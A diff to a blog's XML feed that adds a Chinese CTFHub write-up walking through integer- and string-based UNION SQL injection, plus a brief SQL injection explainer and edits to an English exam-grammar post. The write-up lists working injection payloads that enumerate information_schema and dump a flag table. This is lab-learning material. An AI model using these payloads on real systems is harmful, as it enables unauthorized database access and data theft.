@@ -4,6 +4,60 @@
   
     
     <entry>
+      <title>ctfhubweb刷题之sql</title>
+      <link href="/2023/04/17/123/"/>
+      <url>/2023/04/17/123/</url>
+      
+        <content type="html"><![CDATA[<h1 id="ctfhubweb刷题之sql"><a href="#ctfhubweb刷题之sql" class="headerlink" title="ctfhubweb刷题之sql"></a>ctfhubweb刷题之sql</h1><h2 id="一-SQL整数型注入"><a href="#一-SQL整数型注入" class="headerlink" title="一.SQL整数型注入"></a>一.SQL整数型注入</h2><p>1.输入1得到</p><p><img src="https://cdn.jsdelivr.net/gh/a919649/repo@img/img/image-20230417204927516.png" alt="image-20230417204927516"></p><ol start="2"><li>利用order by得知字段数为2</li></ol><p><img src="https://cdn.jsdelivr.net/gh/a919649/repo@img/img/image-20230417205026165.png" alt="image-20230417205026165"></p><p>3.查询当前数据库名称，</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> slect <span class="number">1</span>,database() </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/a919649/repo@img/img/image-20230417205354085.png" alt="image-20230417205354085"></p><ol start="4"><li><p>爆表 爆列 爆字段得出flag</p><p>爆表：</p></li></ol><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/a919649/repo@img/img/image-20230417205605282.png" alt="image-20230417205605282"></p><p>   爆列：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/a919649/repo@img/img/image-20230417211034070.png"></p><p>爆字段：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(flag) <span class="keyword">from</span> sqli.flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/a919649/repo@img/img/image-20230417210329769.png" alt="image-20230417210329769"></p><h2 id="二-SQL字符型注入"><a href="#二-SQL字符型注入" class="headerlink" title="二.SQL字符型注入"></a>二.SQL字符型注入</h2><p> 进入环境</p><p>1.测试</p><p>按照提示输入一个1试一下</p><p>输入’ and 1&#x3D;1测试一下，发现无法注入</p><p> 输入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1 -- ,</span></span><br></pre></td></tr></table></figure><p>再输入’and 1&#x3D;2 – ,发现报错，所以判断url为字符型注入</p><p> 2.判断列数</p><p>输入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3 -- &#x27;</span></span><br></pre></td></tr></table></figure><p> 再输入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 2 -- &#x27;</span></span><br></pre></td></tr></table></figure><p>得知字段数为2</p><p>3.判断信息在第几列</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2 -- &#x27;</span></span><br></pre></td></tr></table></figure><p>4.查询当前数据库名称， </p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,database() --</span></span><br></pre></td></tr></table></figure><p>数据库名称：sqli</p><p>5.获取数据库名称，</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(schema_name) from information_schema.schemata -- &#x27;</span></span><br></pre></td></tr></table></figure><p>6.查询表名 </p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select table_schema, group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>sqli<span class="string">&#x27; -- &#x27;</span> </span><br></pre></td></tr></table></figure><p>7.查询列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select table_name,(select column_name from information_schema.columns where table_schema=&#x27;</span>sqli<span class="string">&#x27; and table_name=&#x27;</span>flag<span class="string">&#x27; limit 0,1) -- &#x27;</span></span><br></pre></td></tr></table></figure><p>8.查看flag中的内容</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(flag) from sqli.flag -- &#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> web学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> sql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sql学习</title>
+      <link href="/2023/04/17/sql%E5%AD%A6%E4%B9%A0/"/>
+      <url>/2023/04/17/sql%E5%AD%A6%E4%B9%A0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="sql注入学习"><a href="#sql注入学习" class="headerlink" title="  sql注入学习 "></a><center>  sql注入学习 </center></h1><h4 id="一，SQL注入："><a href="#一，SQL注入：" class="headerlink" title="一，SQL注入："></a>一，SQL注入：</h4><p>脚本代码在实现代码与数据库进行数据通讯时，将定义的SQL语句进行执行查询数据。其中通过控制SQL语句的参数传递值来控制SQL语句，从而让SQL语句查询到我们想要的数据。（如管理员的账号密码)</p><h4 id="二，漏洞产生原因："><a href="#二，漏洞产生原因：" class="headerlink" title="二，漏洞产生原因："></a>二，漏洞产生原因：</h4><p>可控变量（参数）特定函数（SQL语句的执行函数）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> sql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>sql-map学习</title>
       <link href="/2023/04/13/post/"/>
       <url>/2023/04/13/post/</url>
@@ -35,7 +89,7 @@
       <link href="/2023/04/13/%E4%B8%93%E5%85%AB%E6%94%B9%E9%94%99%E7%A7%AF%E7%B4%AF/"/>
       <url>/2023/04/13/%E4%B8%93%E5%85%AB%E6%94%B9%E9%94%99%E7%A7%AF%E7%B4%AF/</url>
       
-        <content type="html"><![CDATA[<h1 id="专八改错积累"><a href="#专八改错积累" class="headerlink" title="专八改错积累"></a>专八改错积累</h1><ul><li>词汇辨析</li><li>介词搭配</li><li>语法问题</li><li>短语辨析</li></ul><p>词汇辨析</p><hr><p>专八改错中会涉及到语义错误或搭配错误，准确掌握词汇意义及用法搭配，这一部分就能轻松拿下啦！</p><p>probable一般不作后置定语，而possible可以作后置定语</p><p>receive表被动，accept表主动</p><p>already用于肯定句，yet用于否定句</p><p>myth神话 mystery 神秘的事物</p><p>emergency突发情况 urgency紧急事件 emergence出现</p><p>like 介词加名词、代词、动名词 as是连词，加分句</p><p>respective各自的 irrespective不考虑的，不顾的 irrespective of&#x3D;regardless of</p><p>worth常用结构 worth sth&#x2F;doing sth  worthwhile常用结构 it is worthwhile to do sth</p><p>介词搭配</p><hr><p>专八改错中对于介词的考察也很常见哦，牢牢掌握固定搭配中的介词，轻松拿下！</p><p><strong>In</strong> dilemma</p><p>A supplement <strong>to</strong> </p><p>Resort <strong>to</strong>诉诸于</p><p><strong>In</strong> vogue 正在流行</p><p>Provide sth <strong>for</strong></p><p>Reward sb <strong>for</strong> doing sth</p><p>Be independent <strong>of</strong>不受……支配</p><p>Owing <strong>to</strong>由于</p><p><strong>In</strong> a … style</p><p><strong>With</strong> ease 毫不费力地</p><p>In the wake <strong>of</strong> 紧随某事而来，作为某事的结果</p><p>Contribute to&#x2F; one contributor <strong>to</strong></p><p>The same go <strong>for</strong> 对某人或某物同样适用</p><p>Refer to sth <strong>as</strong>把某物称作</p><p>语法问题</p><hr><p>专八改错中语法问题主要涉及时态，主谓一致，引导词的选用等问题，掌握常考语法点，轻松攻克难关!</p><p>定语从句中先行词为不定代词（如one）时，引导词只能用that不能用which</p><p>As well as，but, except, besides, including, like, with, as much as,  no less than, along with, in addition to, combined with, rather than,  together with遵循就远原则</p><p>either…or…; neither…nor…;not only…but also…;not…but…;there be,here所在倒装句遵循就近原则</p><p>短语辨析</p><hr><p>短语辨析是小编最头疼的部分了呜呜呜，这部分要好好记忆！</p><p>Bring up养育，抚养   bring over带来</p><p>Rather than而不是     other than 除了</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="专八改错积累"><a href="#专八改错积累" class="headerlink" title=" 专八改错积累"></a><center> 专八改错积累</h1><ul><li>词汇辨析</li><li>介词搭配</li><li>语法问题</li><li>短语辨析</li></ul><p>词汇辨析</p><hr><p>专八改错中会涉及到语义错误或搭配错误，准确掌握词汇意义及用法搭配，这一部分就能轻松拿下啦！</p><p>probable一般不作后置定语，而possible可以作后置定语</p><p>receive表被动，accept表主动</p><p>already用于肯定句，yet用于否定句</p><p>myth神话 mystery 神秘的事物</p><p>emergency突发情况 urgency紧急事件 emergence出现</p><p>like 介词加名词、代词、动名词 as是连词，加分句</p><p>respective各自的 irrespective不考虑的，不顾的 irrespective of&#x3D;regardless of</p><p>worth常用结构 worth sth&#x2F;doing sth  worthwhile常用结构 it is worthwhile to do sth</p><p>介词搭配</p><hr><p>专八改错中对于介词的考察也很常见哦，牢牢掌握固定搭配中的介词，轻松拿下！</p><p><strong>In</strong> dilemma</p><p>A supplement <strong>to</strong> </p><p>Resort <strong>to</strong>诉诸于</p><p><strong>In</strong> vogue 正在流行</p><p>Provide sth <strong>for</strong></p><p>Reward sb <strong>for</strong> doing sth</p><p>Be independent <strong>of</strong>不受……支配</p><p>Owing <strong>to</strong>由于</p><p><strong>In</strong> a … style</p><p><strong>With</strong> ease 毫不费力地</p><p>In the wake <strong>of</strong> 紧随某事而来，作为某事的结果</p><p>Contribute to&#x2F; one contributor <strong>to</strong></p><p>The same go <strong>for</strong> 对某人或某物同样适用</p><p>Refer to sth <strong>as</strong>把某物称作</p><p>语法问题</p><hr><p>专八改错中语法问题主要涉及时态，主谓一致，引导词的选用等问题，掌握常考语法点，轻松攻克难关!</p><p>定语从句中先行词为不定代词（如one）时，引导词只能用that不能用which</p><p>As well as，but, except, besides, including, like, with, as much as,  no less than, along with, in addition to, combined with, rather than,  together with遵循就远原则</p><p>either…or…; neither…nor…;not only…but also…;not…but…;there be,here所在倒装句遵循就近原则</p><p>短语辨析</p><hr><p>短语辨析是小编最头疼的部分了呜呜呜，这部分要好好记忆！</p><p>Bring up养育，抚养   bring over带来</p><p>Rather than而不是     other than 除了</p>]]></content>
       
       
       <categories>
